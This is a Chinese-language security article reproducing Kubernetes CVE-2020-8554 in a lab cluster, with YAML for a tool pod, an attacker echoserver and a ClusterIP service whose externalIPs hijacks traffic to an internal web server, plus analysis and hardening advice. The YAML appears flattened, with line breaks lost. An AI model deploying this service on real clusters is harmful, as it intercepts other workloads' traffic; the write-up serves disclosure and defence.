<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nFMK5pLKtR2MDJFGppFypw)

漏洞简介
----

Kubernetes 存在安全漏洞，该漏洞于 2020 年 12 月 8 日在 Kubernetes 的安全通告中被披露。漏洞编号：CVE-2020-8554。如果攻击者可以创建或编辑服务和容器，则此安全问题使攻击者能够拦截来自群集中其他容器（或节点）的流量。攻击者可利用该漏洞通过 Kubernetes 上的 LoadBalancer 或 ExternalIP 充当中间人，以便在会话中读取或写入数据。值得注意的是，该漏洞披露最初是在大约一年前发现的，它揭示了一个影响所有 Kubernetes 版本的设计缺陷，并且目前还没有缓解该问题的软件更新。

影响范围
----

kubernetes 所有版本

背景
--

长期修复方案仍未确定，官网可能从以下四个方面入手修复该漏洞

1）决定停止支持外部 IP，弃用并最终删除该功能  
2）尝试重新设计外部 IP 功能，弃用旧行为并管理向新功能的迁移  
3）接受当前状态，并将 externalip-webhook 升级为内置准入控制器  
4）接受当前状态，并支持 externalip-webhook 作为长期解决方案

为了印证该漏洞的影响，我们对该漏洞进行了复现与解析。

原理
--

集群内某些服务绑定了某些本地网络以外的 IP，导致集群内发往这些 ip 的数据包被 k8s 路由到以上的服务，而非默认网关中。

复现
--

### 准备环境

#### 集群环境

准备以下环境，其中 ubuntu 为主节点，ubuntu2004-0 和 ubuntu1804-0 工作节点  
![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3YvnDzVEice0q3Cprmf6vKfEeWdxUxiamiag73h5qPvjUsoYZTQSprKFIjLn3rTZFkz0TGRPZibHH7QPg/640?wx_fmt=png)

#### yaml 文件

##### test-nettools.yaml

test-nettools.yaml 为工具容器的 yaml 文件，用于测试 http 访问结果。

```
apiVersion: v1kind: Podmetadata:  name: test-nettoolsspec:  containers:    - name: nettools      image: travelping/nettools      command: [ "/bin/sleep", "3600" ]
```

##### echoserver.yaml

echoserver.yaml 为攻击者创建 Deployment 的 yaml 文件，用于在集群内接收被劫持流量

```
apiVersion: v1kind: Namespacemetadata:  name: kubeproxy-mitm---apiVersion: apps/v1kind: Deploymentmetadata:  name: echoserver  namespace: kubeproxy-mitmspec:  replicas: 1  selector:    matchLabels:      app: echoserver  template:    metadata:      labels:        app: echoserver    spec:      containers:      - image: gcr.io/google_containers/echoserver:1.10        name: echoserver        ports:        - name: http          containerPort: 8080        - name: https          containerPort: 8443
```

##### mitm-externalip.yaml

mitm-externalip.yaml，为部署 service 的 yaml 文件, 用以部署劫持服务。

```
apiVersion: v1kind: Servicemetadata:  name: mitm-externalip  namespace: kubeproxy-mitmspec:  ports:  - name: http    port: 80    targetPort: 8080  - name: https    port: 443    targetPort: 8443  selector:    app: echoserver  type: ClusterIP  externalIPs:    - 192.168.254.116
```

##### web 服务

kali.dosec 是集群外内网 web 服务

### 复现过程

#### 1）test-nettools 容器默认在 default namespace 下运行

之后我们会模拟劫持前后使用 test-nettools 容器访问 kali.dosec 这个 web 服务，来观测劫持前后的变化  
![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3YvnDzVEice0q3Cprmf6vKfEdboh9uSrOaLuFiblT1MmqldyHZBhiblBqro5ricqeewWfH2K7vRyZ4OicQ/640?wx_fmt=png)

#### 2）记录 kali.dosec 的 ip 地址

![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3YvnDzVEice0q3Cprmf6vKfEeofh5V1HIx53CtKoVL6kzcF8dUoiaVRF1tI2umOrJBobRwibRw4meD8g/640?wx_fmt=png)

#### 3）记录流量被劫持前，test-nettools 容器访问 kali.dosec 的回显

kali.dosec 是内部搭建的一个 web 测试站点，该站点默认回显内容为 hello,world. This is kali.dosec  
![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3YvnDzVEice0q3Cprmf6vKfESeCfFDXIbtuxHUKus8vMJ3PIMNt2eCBkPgAW8nz6T5GlQXa845ROlg/640?wx_fmt=png)

#### 4）修改，部署 poc

![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3YvnDzVEice0q3Cprmf6vKfEOIZYzxUjriaTicdGY1xiboK01Q8FA5cAicWIzA3Hqw16OZXMDq35Veiabiaw/640?wx_fmt=png)

#### 5）验证部署状态

![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3YvnDzVEice0q3Cprmf6vKfE0vIFoq2BPUfaDOgcA1VYCqeBkE9R8Cu6y8g6VYs8wVrk2MrnpTDZkg/640?wx_fmt=png)

#### 6）利用验证

test-nettools 访问 kali.dosec 但很明显应答是由 echoserver 做出的，即劫持成功，漏洞利用验证通过  
![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3YvnDzVEice0q3Cprmf6vKfEd7NPUAm3y4D71KOUQXTGQKa3Txcce0FCTyBcvDyBlw8SdKRzJoTfBQ/640?wx_fmt=png)

### 视频演示

漏洞分析  

-------

总体来说，该漏洞的成因是 Kubernetes 的设计缺陷。利用该漏洞至少需要 RBAC 权限才能创建，更新或修补服务资源。尤其是：  
1、能够创建 ClusterIP 服务并设置 spec.externalIPs 字段的攻击者可以拦截到该 IP 的流量。  
2、能够修补 LoadBalancer 服务 status.loadBalancer.ingress.ip 的 status.loadBalancer.ingress.ip 字段的攻击者可以拦截到该 IP 的流量。

加固建议
----

1）关注官方对该问题的修复，参考连接如下:  
https://github.com/kubernetes/kubernetes/issues/97110

2) 对 LoadBalancer 和 ExternalIP 进行限制  
参考连接为：https://github.com/kubernetes-sigs/externalip-webhook

下期预告
----

这可能是你看到的 2020 年的封笔之作了，所以记得点赞、评论、转发，一箭三连，突破 3000 才有下期。

![](https://mmbiz.qpic.cn/mmbiz_png/uxzyPCzbE3bW732RU7NAiaZc4JT6DxmZyUNeZGuxDkFCEEStghYzbBh4Va87vPYuw6llsvJzAmVg3I2f9icYTcKA/640?wx_fmt=png)